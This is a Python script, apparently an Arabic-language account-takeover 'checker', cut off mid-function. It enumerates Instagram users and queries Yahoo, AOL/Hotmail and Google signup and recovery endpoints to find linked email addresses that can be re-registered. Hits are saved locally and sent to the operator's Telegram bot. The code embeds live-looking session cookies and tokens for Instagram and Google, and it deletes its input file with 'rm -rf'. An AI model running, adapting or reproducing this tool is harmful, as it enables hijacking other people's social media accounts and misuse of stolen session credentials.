
import requests,names,random,time,webbrowser,os
from time import sleep
from user_agent import generate_user_agent





Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = "\033[1;91m"
C = "\033[1;97m"
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E = '\033[1;31m' #احمر
C = "\033[1;97m" #ابيض





def AloshToolss():
    ali=f"""                                                   

 {C}
  {C}██{F}╗{C}███{F}╗   {C}██{F}╗{C}███████{F}╗{C}████████{F}╗ {C}█████{F}╗ 
  {C}██{F}║{C}████{F}╗  {C}██{F}║{C}██{F}╔════╝╚══{C}██{F}╔══╝{C}██{F}╔══{C}██{F}╗
  {C}██{F}║{C}██{F}╔{C}██{F}╗ {C}██{F}║{C}███████{F}╗   {C}██{F}║   {C}███████{F}║
  {C}██{F}║{C}██{F}║╚{C}██{F}╗{C}██{F}║╚════{C}██{F}║   {C}██{F}║   {C}██{F}╔══{C}██{F}║
  {C}██{F}║{C}██{F}║ ╚{C}████{F}║{C}███████{F}║   {C}██{F}║   {C}██{F}║  {C}██{F}║
  {F}╚═╝╚═╝  ╚═══╝╚══════╝   ╚╝   
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool alosh \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @dtdtd
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @aaalaaa
\033[1;31m--------------------------------

\033[1;33m<\033[2;32m  Account instagram \033[1;33m> 
 """
    for i in ali.splitlines():
        time.sleep(0.07)
        print(i)




        
        

ss='1498548120%3AACrgqJsMHKuiVd%3A27'

Token0 =input("token  ; ")
Id0 = input("id ; ")

def check_send_telegram(Email,User):
	 username=User
	 email=Email
	 cookies = {"sessionid": ss}
	 url_info=(f"https://www.instagram.com/{username}/?__a=1")
	 headers_info={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
	 r=requests.get(url_info,headers=headers_info,cookies=cookies)
	 try:
	  following = r.json()['graphql']['user']['edge_follow']['count']
	  followes = r.json()['graphql']['user']['edge_followed_by']['count']
	  name=r.json()['graphql']['user']['full_name']
	  id=r.json()['graphql']['user']['id']
	  data=requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()
	  bio=r.json()['graphql']['user']['biography']
	  date=data["data"]
	  H=(f"""
ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ 𝚄𝚂𝙴𝚁 :  {username} 
ᯓ 𝙴𝙼𝙰𝙸𝙻 : {email}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followes}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
ᯓ 𝙸𝙳 : {id}
ᯓ 𝙿𝙾𝚂𝚃 : 
ᯓ 𝙱𝙸𝙾 : {bio}
ᯓ 𝙳𝙰𝚃𝙴 : {date}
ᯓ ʟɪɴᴋ : https://instagram.com/{username}
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
By : @aaalaaa - Tele : @DtDtDt
		""")
	  print(F+H)
	  
	  cl = requests.post(f"https://api.telegram.org/bot"+str(Token0)+"/sendMessage?chat_id="+str(Id0)+"&text="+str(H)+"")
	              
	 except:
	  print(X+"no usrs =>> "+Email+" | "+User)                 
def START_INSTAGRAM():
			HH=0
			BB=0
			file = "ACCOUNT.txt"
			fuck = open(file, 'r')
			os.system(f"rm -rf {file}")
			while True:
				user = fuck.readline().split('\n')[0]
				Email=user.split(':')[0]
				User=user.split(':')[1]
				url = "https://www.instagram.com/accounts/login/ajax/"
				headers ={
							"accept": "*/*",
							"set-cookie":"csrftoken=RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP; Domain=.instagram.com; expires=Mon, 16-Jan-2023 13:05:57 GMT; Max-Age=31449600; Path=/; Secure",
							"accept-encoding":"gzip, deflate, br",
							"accept-language":"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",'cookie':'mid=Yc7BvwALAAHRz5pzDqgkxjFCrZ8m; ig_did=AEBE28D3-9EFA-4F75-90EA-4BE6D024C71F; ig_nrcb=1; shbid="1344\0541419696235\0541673472679:01f742ef60230ba2c258cd16a90d3f859aed74cd888a4c6a9cc37ee4afa49a824ab39f7c"; shbts="1641936679\0541419696235\0541673472679:01f79396c9230b4481c7c25f944bd1b13fc11461117cacace5cb86f58b4891be18a3cc60"; rur="CLN\0541419696235\0541673474219:01f7c048ad355269c1ae6696fbc50f586f349788168c0d5e25b57950a3e149aba475c6b"; csrftoken=RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP',
							"content-length": "321",
							"content-type": "application/x-www-form-urlencoded",
							'sec-ch-ua':'"Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
							"sec-ch-ua-mobile": "?0",
							'sec-ch-ua-platform': '"Windows"',
							"sec-fetch-dest": "empty",
							"sec-fetch-mode": "cors",
							"sec-fetch-site": "same-origin",
							"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
							"x-asbd-id": "198387",
							"x-csrftoken": "RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP",
							"x-ig-app-id": "936619743392459",
							"x-ig-www-claim": "0",
							"x-instagram-ajax": "bc3569920aaf",
							"x-requested-with": "XMLHttpRequest"}
				data= {
							"username": str(Email),
							"optIntoOneTap": "false",
							"queryParams": {},
							"stopDeletionNonce": "",
							"trustedDeviceRecords": {}}
				req = requests.post(url,headers=headers,data=data).text
				#print(req)
				if '"user":false' in req:
					BB+=1
				if '"user":true' in req:
					HH+=1
					#print("Yes")
					check_send_telegram(Email,User)
				os.system('cls' if os.name == 'nt' else 'clear')
				print(f"""
{C}
  {C}██{F}╗{C}███{F}╗   {C}██{F}╗{C}███████{F}╗{C}████████{F}╗ {C}█████{F}╗ 
  {C}██{F}║{C}████{F}╗  {C}██{F}║{C}██{F}╔════╝╚══{C}██{F}╔══╝{C}██{F}╔══{C}██{F}╗
  {C}██{F}║{C}██{F}╔{C}██{F}╗ {C}██{F}║{C}███████{F}╗   {C}██{F}║   {C}███████{F}║
  {C}██{F}║{C}██{F}║╚{C}██{F}╗{C}██{F}║╚════{C}██{F}║   {C}██{F}║   {C}██{F}╔══{C}██{F}║
  {C}██{F}║{C}██{F}║ ╚{C}████{F}║{C}███████{F}║   {C}██{F}║   {C}██{F}║  {C}██{F}║
  {F}╚═╝╚═╝  ╚═══╝╚══════╝   ╚╝   
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool alosh \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @dtdtd
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @aaalaaa
\033[1;31m--------------------------------

\033[1;33m<\033[2;32m Deleted following Account instagram \033[1;33m> 

{E}({F}{E}{F}{Email}{E}) {B} 
{E}-------------------------------
{E}({F}➥{E}){F}Good{E} ➥  {F}{HH}
{E}({B}➥{E}){B}Bad{E} ➥ {B}{BB}
{E}-------------------------------
{X}telegram {E}: {F}@aaalaaa
        """)
               
				




def def_gmail(email,user):
	url="https://accounts.google.com/_/lookup/recovery?hl=ar&_reqid=48161&rt=j"
	data={
	'flowEntry':'AccountRecovery',
	'flowName':'GlifWebSignIn',
	'continue':'https://accounts.google.com',
	'ManageAccount?nc':'1',
	'f.req': f'["{email}","AEThLlxbZ6-x9VsMJvsRJzI_5HjtSNewEnO-bIAsu5YcUp7WlybQO8niGOJ32CWETi9YK0X7vxMkgze_Zf6_ResPRkIQ5KRJmsAK_Eon-20ElwvcPZi6vJ1ZqbG7BpbQR5OLXREgeMGgs9AfAw0HqognB5glmdF8oFsC9J8TDoj19pTL8kPbS3xljUEA8oPcXzS63M7r-Sad",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2Fb%2F1%2FAddMailService&followup=https%3A%2F%2Faccounts.google.com%2Fb%2F1%2FAddMailService",null,[],4,[],"GlifWebSignIn",null,[]],1,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{email}",null,null,null,true,true,[]]',
	'bgRequest':'["identifier","<LeFq4awCAAZ62cnJWtmN_ZHAE6Af-0D0ACkAIwj8RlAeoG2eNVb6_9ASq4641R35Pas2qsTNfOzPWzfxHvBuD57z380AAAIUnQAAAAqnAQdWA4j40v4n3ZXdM3w60XS8qJ-sHeYSsXoNSFBTy8jCcbF_7TVMGKw1NWylV2LqHKwJFZFy4HMamAzo4a8PHgyw07afZlNsPcr4Li9nkT76PEa1B8i7oWeMCAYKFWlO4RIVlVt8eBJEnKGlCLv1st0yTa9soFlBznLoZ4Vtg8GcElEKRDvZ61uYNNZvihtpZALhNo4cJJZbVNscCqQbUCrco2j0843iPIyI1BxDH63O0rDu2b_rCleKqO1-eU4Y-gHya_2kkkOKcGe5tOSxwKvsNvdSI_JQytttqfZVWQcd_AN5LO113HTIJc_ehgHSqNT_ucdO5LjBhMbSyAQKd5PPsxr1XE_NZamRMtRX3UUlTV9JmDnD7kf6v7m0Q2tLaaRa7j9BBb2WS-cCacsLcVfY67FE85jczuEsw_nxHARx9fa-tpkmHuWr3PxuHJl4ISU5vzXOczKv5F6eDZpVwuDq4gLQLYu63tL8GiefLd3TakUi4AhfYjLDV45q9nliVPQdotXVYx1GT29eyZSoYPRQZBi7S0UBB6ueRvH7LaoV71sCZwIZd5sncLnOyTz3EVGmbk5aYcUFRcV1_pQZ2qyyM-xR4PGOdQ0hRkktCQAU4L_vdQnALRWhbuUxXDWrwhQsFEgq4x8PsOWC377h2xXeIoa42NDNAsOvgH-EyGNf6dkUifaYMz3OZ7cv4inMOa0EKv-UebBXYGfz0grrnL0QyA4babB4cMLFOaLUFEpsbrx6zOp40_fx5mXSetKH2TmBe4M4dRWytFq2gOHj2ABAxavICMYR22Op0szpIjtqtRlAoyCqBCaAgSZaqEb98XxurRZjFAwNLZRkD8cXQay6AFeRgkurHVVrgi2cB201FP6--k-9WU5M5ByNWUxOCS0UUdwvP7oHBxQP4j2o5-XxVhsyZELbKUH-5mfJUgkzhSnpx31-nfXWQLV5WRZa73C1MJCMt3aoNe2MHiS36SZVW_Yu_by-CFgYVFpwS8r4tBNtMFnvXfEC9kg8xQWkLzABthlC4VpMgY07GAV9pVISROlg399VuN0Kuo3HkLemMmcqspLG7j5JLljNJwwwe9OZvUvQhF-3wZz3qukao4U1HhgsD-bZrzGSpwsSsMFMgq-3rEP5m58gpsQzIGlpYeSiMdNToY9Y-um0yaADfyOyQ_PcE0XXu6yrMqetL-CtSzfFWJxHnFbV3bjT"]',
	'at':'AFoagUVT7sROis7CaMOoSrlc5S72bRcDDw:1649326953947',
	'azt':'AFoagUUxUY4e0E3oz8brzyvGCRKLwu29tQ:1649326953947',
	'cookiesDisabled':'false',
	'deviceinfo':'[null,null,null,[],null,"SY",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]',
	'gmscoreversion':'undefined',
	'checkConnection':'',
	'checkedDomains':'youtube',
	'pstMsg':'1',
	}
	headers={'Host':'accounts.google.com',
	'content-length':'3032',
	'x-same-domain':'1',
	'sec-fetch-dest':'empty',
	'google-accounts-xsrf':'1',
	'user-agent':'Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
	'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
	'accept':'*/*',
	'x-chrome-connected':'mode=0,enable_account_consistency=true,consistency_enabled_by_default=false',
	'origin':'https://accounts.google.com',
	'x-client-data':'CJS2yQEIpbbJAQipncoBCNCvygEIvLDKAQiGtcoBCJe1ygEImbXKAQjttcoBCI66ygEYhZzLAQ==',
	'sec-fetch-site':'same-origin',
	'sec-fetch-mode':'cors',
	'referer':'https://accounts.google.com/signin/v2/recoveryidentifier?flowName=GlifWebSignIn&flowEntry=AccountRecover',
	'accept-encoding':'gzip, deflate, br',
	'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'cookie':'SEARCH_SAMESITE=CgQIjZUB',
	'cookie':'ACCOUNT_CHOOSER=AFx_qI7OfW3bT0KVXzbJQEhvmeK47VCxL5nPqN2n1dsUxsnOovLlpprKYy0sh3kQeLJE3nwbVE74TymUrm1jn1aIVZlCbXlbJLx6UyXHLKPtUU9RYdupncrrLsy-j7Bg0y1cW2CfHzOfEWQvTavy99pCB12fEN3TucAk-amzX5mjjUwev3caVrXWdSkexxCNXAal5vu-Mq67F-tpM-CANDSgT3ubymBdCp5Yar6aSItYj452QtVcLWhypYcm2rb_NORyUHiZuh9eIelFc5EFE8YlnCe8rF94rRlMPlWibieZ0zOTv7vHG1g',
	'cookie':'SID=IgiRFyt27Pgod-d1xt9YFsXXfBZwM8q1wzM-TdlRkTUFBtBgGzrj2p_j4sUv4Om4YNERsA.',
	'cookie':'__Secure-1PSID=IgiRFyt27Pgod-d1xt9YFsXXfBZwM8q1wzM-TdlRkTUFBtBgeOLjuADfsVtjUeN4PajU4g.',
	'cookie':'__Secure-3PSID=IgiRFyt27Pgod-d1xt9YFsXXfBZwM8q1wzM-TdlRkTUFBtBg2PGo1TGpSROdPgYD9ce2XQ.',
	'cookie':'LSID=o.mail.google.com|o.myaccount.google.com|o.myactivity.google.com|s.youtube:IgiRF6VDZ4tAj_mHmH4Za6ozJ1wMH8O41lcTN0vBNkSXrhhvOFe-SqlzgxPS741f9_LGEg.',
	'cookie':'__Host-1PLSID=o.mail.google.com|o.myaccount.google.com|o.myactivity.google.com|s.youtube:IgiRF6VDZ4tAj_mHmH4Za6ozJ1wMH8O41lcTN0vBNkSXrhhv8NfBoZp81kWw1s421y8cwA.',
	'cookie':'__Host-3PLSID=o.mail.google.com|o.myaccount.google.com|o.myactivity.google.com|s.youtube:IgiRF6VDZ4tAj_mHmH4Za6ozJ1wMH8O41lcTN0vBNkSXrhhvARAmxUqzSVKc9wfwchB8vQ.',
	'cookie':'HSID=ApbgcrPXppl0u-ANa',
	'cookie':'SSID=Ay-y0ILgPmEN_wyv0',
	'cookie':'APISID=RB-oU5CBV-R5HLNv/AYxCXNjX9v6vhqjmZ',
	'cookie':'SAPISID=e3QwHxjJiC2-lCgF/A60buK6kVAfNMKf_3',
	'cookie':'__Secure-1PAPISID=e3QwHxjJiC2-lCgF/A60buK6kVAfNMKf_3',
	'cookie':'__Secure-3PAPISID=e3QwHxjJiC2-lCgF/A60buK6kVAfNMKf_3',
	'cookie':'AEC=AVQQ_LD3dhyW-HaSgV9Kqlgn2FDy8yxzKmYDcuZu47ZtYFBPgq5HGCV0tA',
	'cookie':'1P_JAR=2022-04-07-10',
	'cookie':'NID=511=jHqcQ-2Cbjy3OlZNajR4fMCghn_pJdmtQ7-PVjz2v-oq6QX85kXlVJ_vp_-Rm7Zyl2Mw0fma95J5hXk6j7zA6T65wRAgXsIscw6NKRfQqjhqPXE8rpNd_1UAtq5aKVvyRL1kPIMH1RmYGnKT_Qx4WwvIE-WgqwAKvoWuWk-CslKwOMs-v_9SwnA87OmWSVc2J05kiEFEHo40Z5gdrXQ4W2qYOO6NAijY6UyqlKsPM4q8f5JbpGsa_8SYbOZedPw-VvwQShBvQ2IZIYVWq0OLQGQDZJ1Bsurk6Ml7lFK0UlJrgY9p1H-6sCHeUA',
	'cookie':'__Host-GAPS=1:meLb7cvn_6feKsGVOKRUvUgVg8erC_XNViH2XkdCuzcKxcOc-8Na5msI63zn-QmETZH-jI3balYYyEfSPlVQYcOL456RSw:zAyopH6Z-nkHeOsI',
	'cookie':'SIDCC=AJi4QfH2kyXiHWRDNUpV-TCvtU6eVmLAVr6rv9lpEfBf2RFyo4L-s8_BPP27xaVKv18Ivg5IaBY',
	'cookie':'__Secure-3PSIDCC=AJi4QfG2aE-eIY8eZeec4C7xE64supiNgtdMzOxr-YOgsSPLePAPkHP0mo11lm-GQYC8otnVDg',
	
	}
	req=requests.post(url,data=data,headers=headers).text
	if '"gf.alr",5' in req:
		print(F+" ("+C+f"True"+F+") "+C+email)
		e=email+":"+user
		open("ACCOUNT.txt","a").write(str(e)+'\n')
	else:
		print(F+" ("+C+f"False"+F+") "+X+email)
		                
		                
		                
		                
		                
		                






def hotmail(email,user):
        
        url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
        data = {'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":8,"timezoneOffset":-180,"timezone":"Asia/Kuwait","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2070 SUPER Direct3D11 vs_5_0 ps_5_0, D3D11-27.21.14.6589)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":33,"hash":"edeefd360161b4bf944ac045e41d0b21"},"audio":"124.04347527516074","resolution":{"w":"1920","h":"1080"},"availableResolution":{"w":"1040","h":"1920"},"ts":{"serve":1619744892371,"render":1619744891098}}',
            'crumb': 'r77qEhUP8Zi',
            'acrumb': 'actdNdVk',
            'sessionIndex': 'Qg--',
            'displayName': '',
            'deviceCapability': '{"pa":{"status":true}}',
            'username': f'{email}',
            'passwd': '',
            'signin': 'Next',}
        header = {
'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '1523',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'BX=1b42vj5g8mktt&b=3&s=26; GUC=AQEBAQFgjKVglUIcDgRu; A1=d=AQABBL1Ti2ACENobkscxJEwFoiKf-ZlfkBUFEgEBAQGljGCVYAAAAAAA_eMAAAcIvVOLYJlfkBU&S=AQAAAg1vY8DlNy88vuEzORKr02w; A3=d=AQABBL1Ti2ACENobkscxJEwFoiKf-ZlfkBUFEgEBAQGljGCVYAAAAAAA_eMAAAcIvVOLYJlfkBU&S=AQAAAg1vY8DlNy88vuEzORKr02w; A1S=d=AQABBL1Ti2ACENobkscxJEwFoiKf-ZlfkBUFEgEBAQGljGCVYAAAAAAA_eMAAAcIvVOLYJlfkBU&S=AQAAAg1vY8DlNy88vuEzORKr02w&j=WORLD; rxx=2linwi7kfec.2bbayoo5&v=1; cmp=t=1619743677&j=0; spotim_visitId={%22visitId%22:%227f1ca999-7a0f-4227-9a87-6362b7374055%22%2C%22creationDate%22:%222021-04-30T00:47:59.160Z%22%2C%22duration%22:21}; AS=v=1&s=actdNdVk&d=B608ca9fc|TGlLNEn.2SoxcKo7uwbrfIT7smJ.S1WCXCaWY5Q6JxzwyES6EP6Es9_WHPxnTQtlqrD8GjIl.u7BhpStS5yjEv5sbQb0ntlzED5xQ1yhqJt60D4UIGyqx9e17T4wU6zJHls6ygHk5tqBaoux.0lnBq7nFhceD7jvBJ4pildhZJRvfySumMVhzVZyj_.HtnxiAzcWP6rMNEPZbSQC7pbvc1_paXrQUJI1gl.eRfafi8ZRyRJz4FNNNlpCHe9AhipApGREuhhL98TpqRvzqo3dUpF8XhplyA0qqtFlLfF.nnvDzOnOBI2MM57v1ytnuhCVBrb2jtpyGtyZ8IV.iaYl68JOxccoOAKUZAMisHLFbhL2BPM_Gz11Jpn9rNGO..2l1IlB3biQkWPwq.uaUY36LB3zFcwIUFGz.gxn0cL68xuLgEbWQwSINGu9fBNWfJYMTpRJZzB39Pbpxllu1tW4uPGoNLq3SWQxjnkExV3pez_6e74gP6GmacbxnpeqUqLnCtARDg_npneP.5IfIS8QYT1iHf6.hviIUeB1EfIaMVVoSajYWZAWRW7AzjnK7gSVlYD25oyu0k4Z.c6ezlb219W5TwLiuocuOCwLjXmPaojjE62GgffNMDJrROMfbbTjIn7OMyay8FYZleicjD20mGXXNe5GS3WUoqjdhCU8._EqJDZaetD70dHEgkcDfmPwv9ENlo46QYzsExrvVYzIRlExIl0hw3ZZFV5ld97Mfjld6Y17EbD88e.tS_nDOoV_OsHuVuj5.HKKcXgTxVaBkoz_AENpg2ZpAuAkwOntRSZlDypDgFmt0Nk22Klp_p6iQ.5.htaztMuXok3TCNzlvNCGdN4DAha.3tEP23qeIUWyDI53gtIxgfg3~A',
            'Host': 'login.aol.com',
            'Origin': 'https://login.aol.com',
            'Referer': 'https://login.aol.com/?src=fp-us&client_id=dj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2&crumb=UKZxbw6j9tk&intl=us&redirect_uri=https%3A%2F%2Foidc.www.aol.com%2Fcallback&.done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DnjVt4MvPvMf1JE6xXTMCZMRqJfaXjRp8%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }
        r = requests.get(url, data=data, headers=header)
        if "Neither" in r.text:
        	print(F+" ("+C+f"True"+F+") "+C+email)
        	e=email+":"+user
        	open("ACCOUNT.txt","a").write(str(e)+'\n')
        else:print(F+" ("+C+f"False"+F+") "+X+email)
        
        
        
        
        
        


def yahoo(email,user):
 url = 'https://login.yahoo.com/account/module/create?validateField=yid'
 Email=email.replace('@yahoo.com','')
 headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Length': '17973',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': 'APID=UP139a7583-ebf0-11eb-b505-06ebe7a65878; B=1gu92j5gg4sv7&b=3&s=64; A1=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; A3=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; GUC=AQEBAQFg_FZhBEIc3QQ6; cmp=t=1627550703&j=0; APIDTS=1627550737; A1S=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk&j=WORLD; AS=v=1&s=9z9sgq95&d=A6103d241|eavlddr.2Sqtm1snR4vumZPgWEv2CX8ETv8qsCVpXUOAi6BcDaqYAawFRdXZOH3x1ZhIOOPANiSybHZ1j1IBJfKp_yUQeVT2a7U2iFeceXk3DV8Yf6fdA4Mb3M_1A3WY2rpfLpkN2geA1AHRb_QuK0p_gvRBC25hCJqX6_BqNWBCQZ40y2vcTOUrMHZQRGCPbygJ4jCC1pmj16D_TNVaFo68GkkgrxHiFpLQEP9zBsfEM9g8FM8Qd3Gs8oJHQRyvyel09x3uEdniEFCXR93nRCcOMMKCI7xvW239gVcz1Gs_5hmZv6aql00Zge0HJaK6YKPDg9Q7rFfMe7pJry4gCuNMiq_bH9TeBHQEGjqLCJR_d8hcSFHxUnNah4D8.hwV7o1hyYUKQl2Pw6aVKPizRyscmuz0Rwa1LUKGV0O2ls2MSsR4g4TzVlLObvUuKBdrdIJJD3Em1NsNsXKj3uyr.XgZV3E09rJQbldIcePNMPkT7jJjydoGuIBVbqutW0MgHN5IShbRcy6cVifEmil4551or5xaGO5kNpIDCbjUmhD8.MnIfBGRlSIITVGGoQhj3l5TBA742dFc_zcZJmtF5XIrHTr_wMpbpc3ZzD1SgWTDMvySFcsTwH8DdIPhUw4c5QUfyh0kECQFV6OG2M9B06c1wayVg_OiVhy6B6u8Q5AHjbRhsacLtI8K7KxG3JA6oxXmOla3MUX35XvU2axN9DChrM3gpJlJYgmqxV454FF23dysnz4sixK8tvwUc.4EiOU_5OfNGmgZpA.MiCif_oYX3m92DAi38QIl~A',
    'Host': 'login.yahoo.com',
    'Origin': 'https://login.yahoo.com',
    'Referer': 'https://login.yahoo.com/account/create?.lang=ar-JO&src=homepage&specId=yidReg&done=https%3A%2F%2Fwww.yahoo.com',
    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    'sec-ch-ua-mobile': '?0',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': str(generate_user_agent()),
    'X-Requested-With': 'XMLHttpRequest'}    
 data = {
    'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1627553991633,"render":1627553997166}}',
    'specId': 'yidreg',
    'crumb': 'rak/FdAmWa5',
    'acrumb': '9z9sgq95',
    'done': 'https://www.yahoo.com',
    'attrSetIndex': '0',
    'tos0': 'oath_freereg|xa|ar-JO',
    'yid': Email,
    'password': 'zaidkaream1',
    'shortCountryCode': 'AF',}	 
 response = requests.post(url,headers=headers,data=data).text
 if ('"yid"') in response:
 	print(F+" ("+C+f"False"+F+") "+X+email)
 elif ('"birthDate"') in response:
 	print(F+" ("+C+f"True"+F+") "+C+email)
 	e=email+":"+user
 	open("ACCOUNT.txt","a").write(str(e)+'\n')
 	
 	
 	
def choice():
 os.system('clear');AloshToolss()
 print(A+" ---------------------------") 
 print(F+"("+C+"01"+F+") "+C+"GET EMAIL YAHOO")
 print(F+"("+C+"02"+F+") "+C+"GET EMAIL HOTMAIL ")
 print(F+"("+C+"03"+F+") "+C+"GET EMAIL GMAIL ")
 print(F+"("+C+"04"+F+") "+C+"GET EMAIL OUTLOOK ")
 print(F+"("+C+"05"+F+") "+C+"GET EMAIL OUTLOOK.SA ")
 print(A+" ---------------------------")
 Tools= input(F+"("+C+"⌯"+F+") "+C+" CHOOSE  "+Z+" : "+F)
 
 
 
 
 if Tools == str("1"):
	 cc="yahoo"
	 head= {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+ss}
	 while True:
	  name = names.get_first_name(gender='femal')
